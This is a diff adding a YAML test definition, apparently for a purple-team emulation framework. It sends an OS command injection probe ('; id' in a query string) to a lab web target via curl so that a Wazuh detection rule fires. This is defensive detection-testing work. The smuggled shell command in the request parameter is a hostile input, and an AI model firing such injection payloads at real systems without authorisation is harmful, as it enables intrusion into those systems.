@@ -1,0 +1,21 @@
+- id: a1190003-0000-4000-8003-000000000003
+  name: T1190 OS Command Injection Probe
+  description: >
+    Sends a command injection payload (; id) in the query string to the web target.
+    Intended to trigger Wazuh rule 100824 (OS command injection pattern in HTTP
+    request path). The request does not need to succeed; the Traefik log entry
+    containing the payload drives the detection.
+  tactic: initial_access
+  technique:
+    attack_id: T1190
+    name: Exploit Public-Facing Application
+  platforms:
+    linux:
+      sh:
+        command: |
+          curl -sk -o /dev/null -w "cmdi_probe status=%{http_code}\n" \
+            "http://#{app.web_target}/exec?cmd=%3B+id" \
+            -H "X-Purple-Team-Exercise: phase2-t1190-cmdi" \
+            --max-time 10 2>&1 || true
+        cleanup: |
+          true
